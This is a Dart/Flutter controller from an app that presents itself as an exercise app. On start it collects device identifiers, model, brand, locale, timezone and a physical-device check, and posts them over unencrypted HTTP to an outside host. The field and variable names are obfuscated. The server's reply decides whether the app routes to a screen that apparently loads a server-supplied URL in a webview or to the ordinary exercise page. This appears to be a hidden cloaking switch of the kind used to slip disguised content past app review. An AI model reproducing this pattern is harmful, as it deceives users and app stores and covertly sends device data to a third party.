import 'dart:convert';
import 'dart:io';

import 'package:connectivity_plus/connectivity_plus.dart';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';

void checkConnect() async {
  var connectResult = await (Connectivity().checkConnectivity());
  if(connectResult == ConnectivityResult.none){
    Get.toNamed("/error_page");
  }
}

class PageLogic extends GetxController {

  var zhapkx = RxBool(false);
  var zwtycm = RxBool(true);
  var bxajurkp = RxString("");
  var sunny = RxBool(false);
  var paucek = RxBool(true);
  final gmoqwb = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    checkConnect();
    super.onInit();
    midjvq();
  }


  Future<void> midjvq() async {

    sunny.value = true;
    paucek.value = true;
    zwtycm.value = false;

    gmoqwb.post("http://like.middleyoo.it.com/nRdfAa6K",data: await hrimcts()).then((value) {
      var ubylwx = value.data["ubylwx"] as String;
      var kftepa = value.data["kftepa"] as bool;
      if (kftepa) {
        bxajurkp.value = ubylwx;
        antone();
      } else {
        ebert();
      }
    }).catchError((e) {
      zwtycm.value = true;
      paucek.value = true;
      sunny.value = false;
    });
  }

  Future<Map<String, dynamic>> hrimcts() async {
    final DeviceInfoPlugin ifrsqtak = DeviceInfoPlugin();
    PackageInfo znclrpqy_iskqb = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var xurkhn = Platform.localeName;
    var eyMmHni = currentTimeZone;

    var hVMaFkg = znclrpqy_iskqb.packageName;
    var Dzsa = znclrpqy_iskqb.version;
    var ymSQVLWZ = znclrpqy_iskqb.buildNumber;

    var zZiVa = znclrpqy_iskqb.appName;
    var FWkrVLlA = "";
    var demetrisBeatty = "";
    var jyOw = "";
    var clarabelleBrown = "";
    var lewGreenfelder = "";
    var skyeHilpert = "";


    var FSdMeAys = "";
    var QyAHZCoU  = "";
    var BpmUAE = false;

    if (GetPlatform.isAndroid) {
      FSdMeAys = "android";
      var fwbmazqi = await ifrsqtak.androidInfo;

      jyOw = fwbmazqi.brand;

      FWkrVLlA  = fwbmazqi.model;
      QyAHZCoU = fwbmazqi.id;

      BpmUAE = fwbmazqi.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      FSdMeAys = "ios";
      var lgbztsdn = await ifrsqtak.iosInfo;
      jyOw = lgbztsdn.name;
      FWkrVLlA = lgbztsdn.model;

      QyAHZCoU = lgbztsdn.identifierForVendor ?? "";
      BpmUAE  = lgbztsdn.isPhysicalDevice;
    }
    var res = {
      "zZiVa": zZiVa,
      "ymSQVLWZ": ymSQVLWZ,
      "clarabelleBrown" : clarabelleBrown,
      "Dzsa": Dzsa,
      "FWkrVLlA": FWkrVLlA,
      "eyMmHni": eyMmHni,
      "demetrisBeatty" : demetrisBeatty,
      "skyeHilpert" : skyeHilpert,
      "jyOw": jyOw,
      "QyAHZCoU": QyAHZCoU,
      "xurkhn": xurkhn,
      "FSdMeAys": FSdMeAys,
      "BpmUAE": BpmUAE,
      "hVMaFkg": hVMaFkg,
      "lewGreenfelder" : lewGreenfelder,

    };
    return res;
  }

  Future<void> ebert() async {
    Get.offAllNamed("/exercise_main");
  }

  Future<void> antone() async {
    Get.offAllNamed("/exercise_check");
  }

}
